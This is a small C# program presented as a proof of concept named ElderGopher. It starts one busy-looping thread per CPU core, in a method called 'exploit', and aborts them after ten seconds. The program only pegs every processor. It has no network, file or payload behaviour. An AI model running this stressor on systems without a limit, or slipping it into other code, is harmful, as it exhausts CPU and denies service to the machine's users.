using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ElderGopher
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This PoC will only last for 10 seconds. Just endure it.");
            List<Thread> threads = new List<Thread>();
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                Thread t = new Thread(exploit);
                t.Start();
                threads.Add(t);
            }
            Thread.Sleep(10000);
            foreach (var t in threads)
            {
                t.Abort();
            }
        }
        public static void exploit(object a)
        {
            Stopwatch watch = new Stopwatch();
            watch.Start();
            while (true)
            {
                if (watch.ElapsedMilliseconds > 100)
                {
                    watch.Reset();
                    watch.Start();
                }
            }
        }
    }
}
